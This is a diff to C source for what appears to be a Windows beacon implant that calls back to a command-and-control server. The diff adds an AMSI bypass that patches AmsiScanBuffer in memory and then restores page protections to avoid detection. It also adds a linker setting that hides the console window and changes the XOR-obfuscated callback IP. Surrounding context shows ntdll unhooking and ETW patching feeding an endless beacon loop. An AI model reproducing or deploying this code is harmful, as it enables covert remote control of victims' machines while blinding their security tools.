@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <time.h>
 #pragma comment(lib, "wininet.lib")
+#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
 
 typedef struct
 {
@@ -82,6 +83,21 @@ void patchETW()
 
 }
 
+void patchAMSI()
+{
+    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; 
+
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    FARPROC loadlib = GetProcAddress(amsi, "AmsiScanBuffer");
+
+    DWORD oldProtect;
+    VirtualProtect(loadlib, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(loadlib, patch, sizeof(patch)); //Makes AMSI blind
+    
+    //Fixes permissions so they don't look weird
+    VirtualProtect(loadlib, sizeof(patch), PAGE_EXECUTE_READ, &oldProtect);
+}
+
 
 
 HINTERNET hInternet;
@@ -97,7 +113,7 @@ char sizeCompname[MAX_PATH];
 char beaconID[9];
 void sendOutput(char* output);
 
-char ip[]       = {0x64, 0x67, 0x62, 0x7B, 0x65, 0x7B, 0x65, 0x7B, 0x64, 0x00}; 
+char ip[] = {0x64, 0x65, 0x7B, 0x64, 0x65, 0x7B, 0x64, 0x65, 0x7B, 0x64, 0x00}; 
 char brow[]     = {0x18, 0x3A, 0x2F, 0x3C, 0x39, 0x39, 0x34, 0x7A, 0x60, 0x7B, 0x65, 0x00};
 char check[]    = {0x7A, 0x36, 0x3D, 0x30, 0x36, 0x3E, 0x3C, 0x3B, 0x00};
 char cmd_sleep[] = {0x26, 0x39, 0x30, 0x30, 0x25, 0x00};
@@ -236,6 +252,7 @@ int main() {
     generateID();
     unhookNtdll();
     patchETW();
+    patchAMSI();
 
     while (1) {
         beacon();
